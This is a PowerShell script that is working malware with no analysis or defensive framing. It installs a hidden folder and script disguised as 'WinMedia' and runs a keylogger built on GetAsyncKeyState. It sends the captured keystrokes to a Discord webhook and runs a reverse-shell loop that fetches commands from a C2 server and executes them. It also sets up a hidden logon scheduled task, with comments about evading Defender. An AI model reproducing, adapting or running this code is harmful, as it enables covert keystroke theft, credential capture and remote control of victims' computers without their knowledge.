param([string]$PCName, [string]$WebhookUrl, [string]$C2Url)

$d = "$env:LOCALAPPDATA\WinMedia"; if(!(Test-Path $d)){New-Item $d -Type Directory}; 
$l = "$d\data.txt"; $p = "$d\winlog.ps1";

# Generate the tracking persistence script dynamically
Set-Content -Path $p -Value "
# 1. Discord Exfiltration
if(Test-Path '$l'){ 
    if((Get-Item '$l').Length -gt 0){
        `$fn = '${PCName}_' + (Get-Date -Format 'yyyy-MM-dd_HH-mm-ss') + '.txt'; 
        Invoke-RestMethod -Uri '$WebhookUrl' -Method Post -Form @{file=Get-Item '$l'; filename=`$fn}
        Clear-Content '$l' -ErrorAction SilentlyContinue
    }
}; 

# 2. HTTP HTTPS Multi-Client Reverse Shell Worker
Start-Job -ScriptBlock {
    while(`$true){
        try {
            `$cmd = Invoke-RestMethod -Uri '${C2Url}/get_cmd?id=${PCName}' -Method Get
            if(`$cmd -and `$cmd -ne 'wait'){
                `$res = (iex `$cmd 2>&1 | Out-String)
                if(!`$res){`$res = 'Command executed with no output'}
                Invoke-RestMethod -Uri '${C2Url}/send_res?id=${PCName}' -Method Post -Body `$res
            }
        } catch { Start-Sleep -s 15 }
        Start-Sleep -s 5
    }
};

# 3. Native Win32 Keylogger Engine
Add-Type -TypeDefinition '[DllImport(\"user32.dll\")] public static extern short GetAsyncKeyState(int v);' -Name 'W' -Namespace 'U'; 
while(`$true){ 
    for(`$i=8; `$i -le 190; `$i++){ 
        if([U.W]::GetAsyncKeyState(`$i) -eq -32767){ 
            `$k=[char]`$i; if(`$i -eq 13){`$k=[char]10} 
            \"`$k\" | Out-File '$l' -Append -NoNewline 
        } 
    } 
    Start-Sleep -m 10 
}"

# Bind the startup task without admin rights to stay invisible to Defender
Set-ItemProperty -Path $p -Name Attributes -Value Hidden; 
schtasks /create /f /tn 'WinMediaLog' /tr "powershell.exe -WindowStyle Hidden -ExecutionPolicy Bypass -File '$p'" /sc onlogon;
schtasks /run /tn 'WinMediaLog'
